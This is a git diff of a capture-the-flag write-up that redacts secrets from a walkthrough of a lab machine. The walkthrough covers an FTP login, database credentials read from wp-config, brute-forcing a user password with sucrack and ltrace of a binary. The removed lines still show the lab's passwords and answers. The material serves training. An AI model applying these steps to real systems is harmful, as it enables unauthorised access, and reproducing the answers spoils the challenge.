@@ -83,7 +83,7 @@ GOT THE FTP CREDS!!
 └─$ ftp 10.10.58.197    
 Connected to 10.10.58.197.
 220 (vsFTPd 3.0.3)
-Name (10.10.58.197:kali): hakanftp
+Name (10.10.58.197:kali): REDACTED
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -127,7 +127,7 @@ define( 'DB_NAME', 'phpmyadmin1' );
 define( 'DB_USER', 'phpmyadmin' );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', '12345' );
+define( 'DB_PASSWORD', 'REACTED' );
 
 IN THE DATABASE 'phpmyadmin'; TABLE:'wp-users', I FOUND THE CREDS 
 
@@ -201,7 +201,7 @@ AS WE GOT A WORDLIST FROM THE SERVER EARLIER, I APPEND '123adana' TO ALL THE WOR
 THEN I UPLOAD THE WORDLIST TO THE REMOTE MACHINE AND A TOOL NAME SUCRACK WHICH HELPS US BRUTEFORCING THE PASSWORD FOR A USER ON THE SYSTEM
 
 www-data@ubuntu:/tmp$ ./sucrack -u hakanbey -w 100 append.wordlist 
-password is: 123adanasubaru
+password is: REDACTED
 www-data@ubuntu:/tmp$ 
 
 YES I GOT THE USER PASSWORD!!!
@@ -226,14 +226,11 @@ I TRANSFER THE FILE TO MY LOCAL MACHINE AND LTRACE IT:
 ===============================================
 ┌──(kali㉿kali)-[~/different]
 └─$ ltrace ./binary 
-strcat("war", "zone")                                                                                   = "warzone"
-strcat("warzone", "in")                                                                                 = "warzonein"
-strcat("warzonein", "ada")                                                                              = "warzoneinada"
-strcat("warzoneinada", "na")                                                                            = "warzoneinadana"
+strcat("REDACTED", "na")                                                                            = "REDACTED"
 printf("I think you should enter the cor"...)                                                           = 52
-__isoc99_scanf(0x559fc0000edd, 0x7ffc03095420, 0, 0I think you should enter the correct string here ==>warzoneinada
+__isoc99_scanf(0x559fc0000edd, 0x7ffc03095420, 0, 0I think you should enter the correct string here ==>REDACTED
 )                                                    = 1
-strcmp("warzoneinada", "warzoneinadana")                                                                = -110
+----REDACTED---
 strcat("pki", "l")                                                                                      = "pkil"
 strcat("pkil", "l")                                                                                     = "pkill"
 strcat("pkill", " -9")                                                                                  = "pkill -9"
@@ -263,7 +260,7 @@ LETS TRANSFER THE FILE (JPG) TO OUR LOCAL MACHINE
 THIS HINT MEANS THAT TAKE THE 20 OFFSET FROM THE FILE USING THE HEXEDITOR AND THEN DECODE IT USING CYBERCHEF
 FIRST FROM HEX THEN TO BASE85
 
-root:Go0odJo0BbBro0o
+root:REDACTED
 
 GOT THE ROOT PASSWORD
 GOT THE ROOT FLAG
